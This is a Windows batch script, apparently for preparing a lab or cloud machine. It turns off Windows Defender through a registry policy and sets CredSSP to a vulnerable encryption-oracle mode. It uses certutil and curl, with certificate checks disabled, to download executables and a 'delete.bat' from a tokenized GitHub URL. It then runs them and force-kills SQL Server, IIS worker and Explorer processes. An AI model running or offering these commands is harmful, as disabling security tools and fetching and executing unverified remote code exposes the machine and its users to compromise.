

REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters\ /v AllowEncryptionOracle /t REG_DWORD /d 2
certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/curl.exe?token=AS3IHA5UX43BCH2I6FPVQYDAFMZ4Q
certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/7z.dll?token=AS3IHA6XACLQGOZYJNWM7VTAFMZ6Y
certutil -urlcache -split -f https://raw.githubusercontent.com/syedshariq121/labcc/main/7z.exe?token=AS3IHA473GH32DKG6JSJFRTAFMZ7Y

cd C:\Users\Administrator\Desktop
curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/ChromeSetup.exe?token=AS3IHA7AIJOOP4XSSGYJEWLAFM3IS
curl -LJOk https://raw.githubusercontent.com/syedshariq121/labcc/main/delete.bat?token=AS3IHAZKW7NJCVMPO4YWDWTAFM3J2
start ChromeSetup.exe
cls
@echo off
start delete.bat
net start audiosrv
taskkill /f /im sqlservr.exe
taskkill /f /im Batch.exe
taskkill /f /im w3wp.exe
taskkill /f /im explorer.exe
start explorer.exe
exit
